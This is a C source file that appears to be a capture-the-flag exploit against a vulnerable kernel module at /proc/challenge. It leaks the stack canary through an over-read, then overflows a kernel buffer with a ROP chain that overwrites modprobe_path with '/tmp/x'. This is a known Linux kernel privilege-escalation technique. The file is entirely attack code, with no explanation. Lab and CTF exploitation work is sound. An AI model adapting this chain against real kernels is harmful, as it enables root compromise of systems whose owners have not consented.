#include <stdio.h>
#include <assert.h>
#include <unistd.h>
#include <fcntl.h>

unsigned long leak_canary(int fd)
{
    unsigned long leak[5];
    read(fd, leak, sizeof(unsigned long) * 5);
    return leak[4];
}

void overflow_buffer(int fd, unsigned long canary)
{
    unsigned long payload[11];

    payload[4] = canary;

    payload[5] = 0xffffffff81006c6b; // pop rbx; ret
    payload[6] = 0xffffffff82444620; // rbx = modprobe_path

    payload[7] = 0xffffffff81034b72; // pop rdx; ret 
    payload[8] = 0x0000782f706d742f; // rdx = "/tmp/x"

    payload[9]  = 0xffffffff81058d44; // mov qword ptr [rbx], rdx; pop rbx; ret
    payload[10] = 0x00;               // rbx = 0x00

    write(fd, payload, sizeof(unsigned long) * 11);
}

int main(int argc, char **argv)
{
    int fd = open("/proc/challenge", O_RDWR);
    assert(fd > 0);

    /* leak stack canary */
    unsigned long canary = leak_canary(fd);
    printf("[*] canary @ 0x%lx\n", canary);

    overflow_buffer(fd, canary); 

    return 0;
}

